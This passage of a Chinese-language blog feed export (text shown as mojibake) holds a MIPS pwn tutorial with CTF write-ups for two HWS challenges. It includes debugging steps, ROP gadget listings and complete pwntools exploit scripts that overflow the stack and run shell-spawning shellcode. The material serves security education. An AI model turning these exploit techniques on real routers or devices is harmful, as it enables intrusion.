P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                              </span><br><span class="line">                &#125;                                                              </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;                                                              </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                      </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                      </span><br><span class="line">            &#125;                                                                                 &#125;                                                                      </span><br><span class="line">       &#125;                                                                              &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFå°çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIPS PWNå…¥é—¨</title>
      <link href="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/"/>
      <url>/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="2021HWSå†¬ä»¤è¥å…¥è¥èµ›èµ›é¢˜â€“Mplogin"><a href="#2021HWSå†¬ä»¤è¥å…¥è¥èµ›èµ›é¢˜â€“Mplogin" class="headerlink" title="2021HWSå†¬ä»¤è¥å…¥è¥èµ›èµ›é¢˜â€“Mplogin"></a>2021HWSå†¬ä»¤è¥å…¥è¥èµ›èµ›é¢˜â€“Mplogin</h4><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/1-1633421980904.png" class=""><p>32ä½å°ç«¯åºï¼Œå¹¶ä¸”å…¨çº¢ï¼Œ<code>xuanxuan</code>è€å¸ˆè¯´MIPSä¸æ”¯æŒNXï¼Œå»æŸ¥é˜…èµ„æ–™ï¼Œæ²¡æ‰¾åˆ°ç›¸å…³çš„æ–‡ç« ï¼Œä¸è¿‡åœ¨å¤ç°RV110Wçš„æ—¶å€™ï¼Œå®ƒç¡®å®æ²¡æœ‰NXâ€¦</p><blockquote><p>å½“ç„¶MIPSç¡¬ä»¶æœ¬èº«ä¹Ÿä¸æ”¯æŒNXæœºåˆ¶</p></blockquote><p>ç¨‹åºå°±ä¸¤ä¸»è¦çš„å‡½æ•°ï¼Œé€»è¾‘ä¹Ÿå¾ˆç®€å•ï¼Œç»å…¸<code>read</code>æ— æˆªæ–­æ³„éœ²åœ°å€ï¼Œè¿™ä¸ªåœ°å€æ˜¯ä»€ä¹ˆåœ°å€ç­‰ä¸‹åŠ¨æ€çš„æ—¶å€™åœ¨çœ‹</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/2-1633421980904.png" class="">ç¬¬äºŒä¸ªå‡½æ•°å°±å­˜åœ¨æº¢å‡ºï¼Œäººå®¶v2å°±20å­—èŠ‚è¯»äº†36å­—èŠ‚ï¼Œæº¢å‡ºåˆ°v3äº†éƒ½ï¼Œä¸‹ä¸€ä¸ª`read`çš„æ—¶å€™ï¼Œå°±èƒ½æ— é™åˆ¶è¯»ï¼Œç›´æ¥è¦†ç›–è¿”å›åœ°å€ï¼ŒåŠ«æŒæ§åˆ¶æµï¼Œåé¢è¿˜æœ‰æ£€æŸ¥ï¼Œæ³¨æ„ä¸€ä¸‹å°±è¡Œ...<img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/3-1633421980905.png" class=""><p>å¼€å§‹è°ƒè¯•â€¦å’ŒX86ä¸åŒï¼Œå¼‚æ¶æ„çš„PWNå°±éœ€è¦ç”¨åˆ°è¿œç¨‹è°ƒè¯•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -g 1234 -L ./ ./Mplogin</span><br></pre></td></tr></table></figure><p>-g ï¼šæš´éœ²è°ƒè¯•ç«¯å£</p><p>-L ï¼šåœ¨ç¨‹åºå¯»æ‰¾åŠ¨æ€é“¾æ¥åº“çš„æ—¶å€™ä¼˜å…ˆåœ¨æ­¤ç›®å½•ä¸‹å¯»æ‰¾</p><p>ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å†å¯åŠ¨ä¸€ä¸ªçª—å£ç”¨<code>gdb-mutilarch</code>è¿æ¥ä¸Šæˆ‘ä»¬çš„<code>qemu</code>æš´éœ²çš„è°ƒè¯•æ¥å£ï¼Œè¿æ¥ä¹‹åå°±å¯ä»¥è¿›è¡Œè°ƒè¯•å•¦ï¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line"><span class="built_in">set</span> arch mips</span><br><span class="line"><span class="built_in">set</span> endian little</span><br><span class="line">target remote :1234</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p>å†<code>0x4008D4</code>å¤„ä¸‹æ–­ç‚¹ï¼Œçœ‹çœ‹å®ƒæ³„éœ²çš„åœ°å€åˆ°åº•æ˜¯å•¥ï¼Œå®ƒå› ä¸ºæ²¡æœ‰å¼€åœ°å€éšæœºåŒ–ï¼Œæ‰€ä»¥ä¸€ç›´éƒ½æ˜¯è¿™ä¸ªåœ°å€ï¼Œå¾ˆå®¹æ˜“å°±è®¤å‡ºæ¥ï¼Œå¯ä»¥çœ‹åˆ°æ³„éœ²çš„æ˜¯æ ˆé¡¶æŒ‡é’ˆ</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/6.jpg" class=""><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/4-1633421980905.png" class=""><blockquote><p>ç”±äºMIPSçš„ç‰¹æ®Šæ€§ï¼Œåœ¨å‡½æ•°ä½“ä¸­<code>$fp</code>å’Œ <code>$sp</code>æ˜¯ç›¸åŒçš„ï¼Œå³éƒ½æŒ‡å‘æ ˆé¡¶ï¼Œæ•…è¿™é‡Œæ³„éœ²å‡ºçš„å°±æ˜¯<code>main</code>å‡½æ•°è¿›å…¥<code>sub_400840</code>æ˜¯çš„æ ˆé¡¶åœ°å€</p></blockquote><p>ä¸‹é¢æµ‹è¯•åœ¨ç¬¬äºŒä¸ªå‡½æ•°æº¢å‡ºçš„åç§»ï¼Œç›´æ¥å‘ç”Ÿ<code>cyclic(200)</code>çš„å­—ç¬¦ï¼Œæµ‹è¯•å‡ºåç§»æ˜¯30ï¼ˆä¸åŒ…æ‹¬å‰é¢çš„0123456789</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.send(<span class="string">&#x27;0123456789&#x27;</span>+cyclic(<span class="number">200</span>))</span><br></pre></td></tr></table></figure><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/5-1633421980905.png" class=""><p>ç›´æ¥<code>jmp sp</code>åŠ <code>shellcode</code>æ‹¿<code>sehll</code>ä¸€æ°”å‘µæˆâ€¦</p><p>å®Œæ•´exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process([&quot;qemu-mipsel&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./Mplogin&quot;])</span></span><br><span class="line">io = process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;-g&quot;</span>,<span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./&quot;</span>,<span class="string">&quot;./Mplogin&quot;</span>])</span><br><span class="line">elf = ELF(<span class="string">&#x27;./Mplogin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Username : &#x27;</span>)</span><br><span class="line">io.send(<span class="string">&#x27;admin&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">19</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">19</span>)</span><br><span class="line">addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]addr =&gt; &quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Pre_Password : &#x27;</span>)</span><br><span class="line">io.send(<span class="string">&#x27;access&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">14</span>+p32(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">&#x27;0123456789&#x27;</span>.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)+p32(addr)+asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>å°é—®é¢˜&amp;&amp;ä»¥åè¦æ³¨æ„çš„é—®é¢˜ï¼š</p><p>è°ƒè¯•çš„æ—¶å€™ä¸€å †SWæ˜¯ä»€ä¹ˆé¬¼ï¼Ÿï¼Ÿï¼Ÿ</p><p>ä»¥ååœ¨å‘é€æ•°æ®çš„æ—¶å€™åƒä¸‡è¦æ³¨æ„ï¼Œæ¢è¡Œç¬¦å¯¹<code>payload</code>çš„å½±å“â€¦</p><h4 id="2021HWSå†¬ä»¤è¥å…¥è¥èµ›èµ›é¢˜â€“pwn"><a href="#2021HWSå†¬ä»¤è¥å…¥è¥èµ›èµ›é¢˜â€“pwn" class="headerlink" title="2021HWSå†¬ä»¤è¥å…¥è¥èµ›èµ›é¢˜â€“pwn"></a>2021HWSå†¬ä»¤è¥å…¥è¥èµ›èµ›é¢˜â€“pwn</h4><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/8.png" class=""><p>å¼€äº†<code>canary</code>ï¼Œä½†åœ¨å®é™…æµ‹è¯•ä¸­<code>canary</code>å¹¶æ²¡æœ‰èµ·æ•ˆï¼Œæ€€ç–‘æ˜¯<code>qemu</code>æœ¬èº«ä¸æ”¯æŒ<code>canary</code>ï¼ˆä¸å¤ªæ¸…æ¥šï¼Œqemuæœ¬èº«ä¸æ”¯æŒNXæ˜¯çœŸçš„ï¼‰</p><p>ç¨‹åºå°±ä¸€ä¸ª<code>pwn</code>å‡½æ•°ï¼Œåº”è¯¥å°±æ˜¯å…³é”®å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">  v6 = (_BYTE *)<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">  <span class="built_in">puts</span>((<span class="keyword">int</span>)<span class="string">&quot;Enter the group number: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !_isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v18) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v18[<span class="number">0</span>] || v18[<span class="number">0</span>] &gt;= <span class="number">0xA</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;The numbers is illegal! Exit...\n&quot;</span>, <span class="number">1</span>, <span class="number">32</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v18[<span class="number">1</span>] = (<span class="keyword">int</span>)&amp;v3;</span><br><span class="line">  v9 = <span class="number">36</span>;</span><br><span class="line">  v10 = <span class="number">36</span> * v18[<span class="number">0</span>];</span><br><span class="line">  v11 = <span class="number">36</span> * v18[<span class="number">0</span>] - <span class="number">1</span>;</span><br><span class="line">  v12 = v4;</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">36</span> * v18[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i &lt; v18[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v18[<span class="number">0</span>] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v13 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)v12 + i * v9);</span><br><span class="line">    v14 = v13;</span><br><span class="line">    <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">puts</span>((<span class="keyword">int</span>)<span class="string">&quot;Enter the id and name, separated by `:`, end with `.` . eg =&gt; &#x27;1:Job.&#x27; &quot;</span>);</span><br><span class="line">    v15 = read(<span class="number">0</span>, v6, <span class="number">768</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v13 )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = atoi(v6);</span><br><span class="line">      *v14 = v0;</span><br><span class="line">      v16 = <span class="built_in">strchr</span>(v6, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; v6++; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *v6 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = v6;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v17 = &amp;v5[-v16];</span><br><span class="line">      <span class="keyword">if</span> ( !v16 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>((<span class="keyword">int</span>)<span class="string">&quot;format error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memcpy</span>(v14 + <span class="number">1</span>, v16 + <span class="number">1</span>, v17);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">      v14[<span class="number">1</span>] = <span class="string">&#x27;aaa\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆå¿«å¯ä»¥å‘ç°æº¢å‡ºç‚¹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v6 = (_BYTE *)<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">v15 = read(<span class="number">0</span>, v6, <span class="number">768</span>);</span><br><span class="line">v17 = &amp;v5[-v16];</span><br><span class="line"><span class="built_in">memcpy</span>(v14 + <span class="number">1</span>, v16 + <span class="number">1</span>, v17);</span><br></pre></td></tr></table></figure><p>å®ƒå…ˆæ˜¯å †æº¢å‡ºç„¶åå†æŠŠå †ä¸Šçš„å†…å®¹<code>memcpy</code>åˆ°æ ˆä¸Š</p><p>é‚£æ¥ä¸‹æ¥å°±è¯¥è°ƒè¯•åç§»äº†ï¼Œ<code>cyclic 200</code>å‘è¿‡å»ï¼Œå‘ç°è¦†ç›–åˆ°FPä½†åˆ°ä¸äº†PCå¯„å­˜å™¨ï¼Œåªèƒ½è‡ªå·±ç®—ç®—åç§»</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/9.png" class=""><p>æ‰“å¼€æ ˆå¸ƒå±€çœ‹çœ‹</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/10.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paylaod = <span class="string">&#x27;1:&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>+p32(<span class="number">0xdeadbeef</span>)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆåŠŸçš„è¦†ç›–äº†è¿”å›åœ°å€</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/11.png" class=""><p>ç”±äºæ­¤ç¨‹åºæ˜¯é™æ€é“¾æ¥çš„æ–‡ä»¶ï¼Œæ‰€ä»¥æš‚æ—¶ä¸è€ƒè™‘<code>ret2libc</code>ï¼Œè¿˜æ˜¯<code>ROP+shellcode</code>çš„ç»„åˆï¼Œé€šè¿‡<code>mipsrop</code>æ‰¾åˆ°å¯ç”¨çš„<code>gadget</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.stackfinder()</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x004273C4  |  addiu $a2,$sp,0x70+var_C                            |  jalr  $s0                             |</span><br><span class="line">|  0x0042BCD0  |  addiu $a2,$sp,0x88+var_C                            |  jalr  $s2                             |</span><br><span class="line">|  0x0042FA00  |  addiu $v1,$sp,0x138+var_104                         |  jalr  $s1                             |</span><br><span class="line">|  0x004491F8  |  addiu $a2,$sp,0x44+var_C                            |  jalr  $s1                             |</span><br><span class="line">|  0x0044931C  |  addiu $v0,$sp,0x30+var_8                            |  jalr  $s1                             |</span><br><span class="line">|  0x00449444  |  addiu $a2,$sp,0x44+var_C                            |  jalr  $s1                             |</span><br><span class="line">|  0x0044AD58  |  addiu $a1,$sp,0x60+var_28                           |  jalr  $s4                             |</span><br><span class="line">|  0x0044AEFC  |  addiu $a1,$sp,0x64+var_28                           |  jalr  $s5                             |</span><br><span class="line">|  0x0044B154  |  addiu $a1,$sp,0x6C+var_38                           |  jalr  $s2                             |</span><br><span class="line">|  0x0044B1EC  |  addiu $v0,$sp,0x6C+var_40                           |  jalr  $s2                             |</span><br><span class="line">|  0x0044B3EC  |  addiu $v0,$sp,0x170+var_130                         |  jalr  $s0                             |</span><br><span class="line">|  0x00454E94  |  addiu $s7,$sp,0xB8+var_98                           |  jalr  $s3                             |</span><br><span class="line">|  0x00465BEC  |  addiu $a1,$sp,0xC4+var_98                           |  jalr  $s0                             |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">Found 13 matching gadgets</span><br><span class="line">Python&gt;mipsrop.find(&quot;move $t9,$a2&quot;)</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x00421684  |  move $t9,$a2                                        |  jr    $a2                             |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">Found 1 matching gadgets</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°è¿™ä¸¤ä¸ªå¯ä»¥ç”¨çš„<code>gadget</code>ï¼Œç¬¬ä¸€æ¡æ˜¯å°†<code>0x70+var_C</code>åŠ åˆ°<code>sp</code>ä¸Šï¼Œ<code>var_C</code>åªæœ‰åœ¨ç¨‹åºè¿è¡Œçš„æ—¶å€™æ‰çŸ¥é“ï¼Œæ‰€ä»¥åªèƒ½åŠ¨è°ƒæ—¶å€™çœ‹åç§»ï¼ŒåŠ å®Œä¹‹åå‘¢ï¼Œå°±æŠŠå®ƒæ”¾åˆ°<code>$a2</code>å½“ä¸­ï¼Œç„¶åè·³è½¬åˆ°<code>s0</code>å»æ‰§è¡Œï¼Œç¬¬äºŒæ¡å‘¢ï¼Œå°±æ˜¯æŠŠ<code>$a2</code>æ”¾åˆ°<code>$t9</code>ï¼Œå†è·³è½¬åˆ°<code>$a2</code>ï¼Œæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯åœ¨<code>0x70+var_C</code>ä¸Šå¸ƒç½®æˆ‘ä»¬çš„<code>shellcode</code>ï¼Œç„¶åå†è·³åˆ°è¿™ä¸Šé¢å»æ‰§è¡Œï¼Œä½†æ˜¯ä»”ç»†åˆ†æä¸€ä¸‹ä¼šå‘ç°ï¼Œ<code>$a2</code>æ˜¯æŒ‡å‘äº†æˆ‘ä»¬çš„<code>shellcode</code>ï¼Œä½†æ˜¯å´å°‘äº†<code>$s0</code>åˆ°<code>$a2</code>çš„ä¸€ä¸ªæ¡¥æ¢ï¼Œå›é¡¾ä¹‹å‰è¦†ç›–<code>$ra</code>å¯„å­˜å™¨çš„æ—¶å€™ï¼Œå¥½åƒæŠŠä¸Šé¢çš„ä¸€äº›å¯„å­˜å™¨ä¹Ÿç»™è¦†ç›–äº†â€¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x004273C4  |  addiu $a2,$sp,0x70+var_C                            |  jalr  $s00x00421684  |  move $t9,$a2                                        |  jr    $a2</span><br></pre></td></tr></table></figure><p>æ²¡é”™ï¼Œå› ä¸ºè¿™æ˜¯å¯„å­˜å™¨çš„å€¼å†å‡½æ•°å¼€å§‹çš„æ—¶å€™å°±å…¥æ ˆäº†</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/12-1633421980905.png" class=""><p>æ—¢ç„¶æœ‰å…¥æ ˆé‚£å¿…ç„¶æœ‰å‡ºæ ˆ</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/13-1633421980905.png" class=""><p>æ‰€ä»¥æˆ‘ä»¬å°±èƒ½æ­å»ºèµ·<code>$s0</code>åˆ°<code>$a2</code>çš„æ¡¥æ¢ï¼Œæ—¢æ˜¯è¦†ç›–çš„æ—¶å€™æŠŠ<code>$s0</code>è¦†ç›–åˆ°è·³è½¬<code>$a2</code>çš„<code>gadget</code>å³å¯ï¼Œ<strong>è®¡ç®—æ–¹æ³•ï¼š0x90-$raçš„åç§»+$s0çš„åç§»</strong>ï¼Œå¹¶ä¸”å†è·³è½¬<code>$ra</code>å¯„å­˜å™¨ä¹‹å‰ï¼Œå®ƒè¿˜æ¸…ç†äº†æ ˆå¸§ï¼Œæ‰€ä»¥<code>shellcode</code>æ”¾åœ¨<code>$ra</code>å¯„å­˜å™¨åçš„åç§»å³å¯ï¼Œè¿™ä¹Ÿè§£é‡Šäº†ä¹‹å‰çš„ä¸€å †<code>sw</code>æ˜¯ä»€ä¹ˆï¼Œè¿™ä¹Ÿæ˜¯MIPSçš„ç‰¹æ€§ï¼Œå®ƒå¹¶æ²¡æœ‰<code>push</code>å’Œ<code>pop</code>æŒ‡ä»¤ï¼Œè€Œæ˜¯é€šè¿‡<code>sw</code>å’Œ<code>lw</code>æ¥å®ç°å…¥æ ˆå’Œå‡ºæ ˆ</p><p>åœ¨è°ƒè¯•çš„çš„æ—¶å€™çœ‹åˆ°addiu $a2,$sp,0x70+var_Cæœ€ç»ˆå˜æˆäº†addiu $a2,$sp,0x64ï¼Œæ‰€ä»¥æŠŠshellcodeçš„åç§»æ”¹æˆ0x64å°±å¯ä»¥ä¸ç”¨é â€nopâ€æ»‘æ¿æŒ‡ä»¤è¿›è¡Œå¡«å……</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/14-1633421980905.png" class=""><p>å®Œæ•´expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;big&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process([<span class="string">&quot;qemu-mips&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line"><span class="comment"># io = process([&quot;qemu-mips&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;./pwn&quot;])</span></span><br><span class="line"><span class="comment"># elf = ELF(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">ra = <span class="number">0x004273C4</span><span class="comment">#addiu $a2,$sp,0x70+var_C|  jalr  $s0</span></span><br><span class="line">s0 = <span class="number">0x00421684</span> <span class="comment">#move $t9,$a2|  jr    $a2</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;number:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter the id and name, separated by `:`, end with `.` . eg =&gt; &#x27;1:Job.&#x27; &quot;</span>)</span><br><span class="line">paylaod = <span class="string">&#x27;1:&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+p32(s0)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(ra)</span><br><span class="line">paylaod += <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+asm(<span class="string">&#x27;nop;nop;nop;nop&#x27;</span>)+shellcode</span><br><span class="line">io.sendline(paylaod)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>æ€»ç»“ï¼š<br>åŸæ¥â€¦<code>ghidra</code>é‡Œé¢çš„<code>var_C</code>è¿™ç±»å‚æ•°æ˜¯å·²ç»ç®—å¥½äº†ï¼Œæˆ‘å°±å¥‡æ€ªï¼Œä¸ºå•¥<code>xuanxuan</code>è€å¸ˆçš„å„ç§å‚æ•°éƒ½æ²¡æœ‰ï¼Œæˆ‘å°±æœ‰ï¼Œç°åœ¨å°±æ–¹ä¾¿å¤šäº†ï¼</p><p><a href="https://github.com/NationalSecurityAgency/ghidra/releases">ä¸‹è½½åœ°å€</a></p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/15-1633421980905.jpg" class=""><p>è¡¥å……èµ„æ–™ï¼š</p><p><a href="https://www.cnblogs.com/L0g4n-blog/p/13968404.html">MIPSæ±‡ç¼–å­¦ä¹ </a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFå°çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RV110Wè·¯ç”±å™¨æ¼æ´å¤ç°/2020å¹´å¼ºç½‘æ¯èµ›é¢˜</title>
      <link href="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/"/>
